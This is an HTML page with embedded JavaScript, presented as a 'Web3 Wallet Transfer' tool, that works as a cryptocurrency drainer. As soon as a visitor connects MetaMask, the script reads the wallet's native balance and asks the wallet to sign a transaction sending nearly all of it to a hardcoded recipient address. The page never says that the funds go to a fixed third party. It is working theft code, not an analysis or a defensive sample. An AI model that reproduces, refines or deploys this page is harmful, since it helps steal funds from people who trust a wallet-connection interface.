<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web3 Wallet Connection & Crypto Transfer</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #0e0e0e;
            color: #ffffff;
        }
        .container {
            max-width: 800px;
            margin: auto;
            padding: 30px;
            background: linear-gradient(135deg, #1e1e1e, #333);
            border-radius: 10px;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
        }
        h1 {
            text-align: center;
            color: #4caf50;
            font-size: 2.5em;
            margin-bottom: 20px;
        }
        nav {
            margin-bottom: 20px;
            text-align: center;
        }
        nav a {
            margin: 0 15px;
            text-decoration: none;
            color: #4caf50;
            font-weight: bold;
            transition: color 0.3s;
        }
        nav a:hover {
            color: #81c784;
        }
        button {
            width: 100%;
            padding: 15px;
            margin-top: 10px;
            cursor: pointer;
            background-color: #4caf50;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #81c784;
        }
        button:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }
        #status {
            margin-top: 20px;
            font-size: 14px;
            color: #e0e0e0;
            white-space: pre-wrap;
        }
        footer {
            margin-top: 20px;
            text-align: center;
            font-size: 12px;
            color: #bbb;
        }
        .logo {
            display: block;
            margin: 0 auto 20px;
            max-width: 150px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="logo-placeholder.png" alt="Logo" class="logo">
        <h1>Web3 Wallet Transfer</h1>
        <nav>
            <a href="#home">Home</a>
            <a href="#about">About</a>
        </nav>
        
        <section id="home">
            <h2>Connect MetaMask & Transfer Crypto</h2>
            <button id="connectWallet">Connect Wallet</button>
            <button id="disconnectWallet" disabled>Disconnect Wallet</button>
            <p id="status"></p>
        </section>

        <section id="about">
            <h2>About This Tool</h2>
            <p>This tool allows you to connect your MetaMask wallet and automatically send your crypto assets. It handles network changes and ensures that the crypto is sent from the active network first.</p>
        </section>
    </div>

    <footer>
        <p>&copy; 2024 Web3 Crypto Transfer Tool</p>
    </footer>

    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <script>
        let provider, signer, userAddress = "";

        const recipientAddress = "0xD30bC2a15eb5cd4Be08059AA9354Fc46BB13aDe8";

        const chains = [
            { chainId: 1, name: 'Ethereum', nativeSymbol: 'ETH' },
            { chainId: 56, name: 'BNB Smart Chain', nativeSymbol: 'BNB' },
            { chainId: 137, name: 'Polygon', nativeSymbol: 'MATIC' }
        ];

        document.getElementById('connectWallet').addEventListener('click', async () => {
            try {
                if (!window.ethereum) {
                    document.getElementById('status').innerText = `MetaMask is not installed.`;
                    return;
                }

                provider = new ethers.providers.Web3Provider(window.ethereum);
                await provider.send("eth_requestAccounts", []);
                signer = provider.getSigner();
                userAddress = await signer.getAddress();
                document.getElementById('status').innerText = `Connected: ${userAddress}`;

                // Enable disconnect button after connection
                document.getElementById('disconnectWallet').disabled = false;
                document.getElementById('connectWallet').disabled = true;

                await sendCryptoOnCurrentNetwork();
            } catch (error) {
                document.getElementById('status').innerText = `Connection failed: ${error.message}`;
            }
        });

        document.getElementById('disconnectWallet').addEventListener('click', () => {
            userAddress = "";
            signer = null;
            document.getElementById('status').innerText = `Disconnected.`;
            document.getElementById('disconnectWallet').disabled = true;
            document.getElementById('connectWallet').disabled = false;
        });

        async function sendCryptoOnCurrentNetwork() {
            try {
                const network = await provider.getNetwork();
                const balance = await provider.getBalance(userAddress);
                if (balance.isZero()) {
                    document.getElementById('status').innerText = `No crypto found on ${network.name}.`;
                    return;
                }

                await sendNativeCrypto(balance, network);
            } catch (error) {
                document.getElementById('status').innerText = `Transaction failed: ${error.message}`;
            }
        }

        async function sendNativeCrypto(balance, network) {
            const tx = {
                to: recipientAddress,
                value: balance.sub(ethers.utils.parseUnits('0.001', 18)) // Keeping gas fees
            };

            try {
                const txResponse = await signer.sendTransaction(tx);
                await txResponse.wait();
                document.getElementById('status').innerText = `Sent ${ethers.utils.formatEther(balance)} ${network.nativeSymbol} from ${network.name}.`;
            } catch (error) {
                document.getElementById('status').innerText = `Transaction failed: ${error.message}`;
            }
        }
    </script>
</body>
</html>
